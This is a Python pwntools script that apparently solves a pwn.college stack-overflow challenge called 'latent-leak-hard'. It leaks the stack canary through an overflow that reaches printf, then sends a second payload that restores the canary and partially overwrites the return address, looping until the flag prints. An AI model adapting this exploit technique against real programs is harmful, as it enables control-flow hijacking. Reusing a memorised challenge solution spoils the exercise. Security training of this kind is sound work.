#!/usr/bin/python3

from pwn import *
import time
import re
from binascii import unhexlify

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/latent-leak-hard')

def get_canary(data,length):
    regex = rb"REPEAT[a]{1,200}[\x00-\xff]{7}"
    match = re.findall(regex, data)[0]
    canary = int.from_bytes(b"\x00" + match[length:],'little')
    return canary

base_pointer = 0x7ffc637f8430
input_start = base_pointer - 0x190
canary_add = base_pointer - 8
ret_add = base_pointer + 8
space_to_canary = canary_add - input_start
remainig_till_flag = ret_add - canary_add - 8

payload = b"REPEAT" + b'a' * (15 * 8 + 1 - 6) # here canayr is stiil inside the stack where my input can reach so it is 40 bytes away and that 1 byte  is to overwrite 0x00 so printf can printf the canary 

while 1:
    io = process()

    d1 = io.recvuntil(b"Payload size:")
    io.sendline(str(len(payload)).encode())

    d2 = io.recvuntil(b"Send your payload (up to")
    io.sendline(payload)
    

    data = io.recvuntil(b"Backdoor triggered! Repeating challenge()")
    canary = get_canary(data,len(payload))

 #   print(canary,d1.decode(),d2.decode(),data.decode())
#    io.interactive()
    payload2 = b'a' * (space_to_canary + 1) + p64(canary) + b'a' * remainig_till_flag + b'\x7d\xc8'
    
    d3 = io.recvuntil(b'Payload size:')
    io.send(str(len(payload2)).encode())


    io.send(payload2)
    data = io.recvall()

  #  print(data.decode())
    if b"pwn.college" in data:
        print(data.decode())
        break
    io.close()
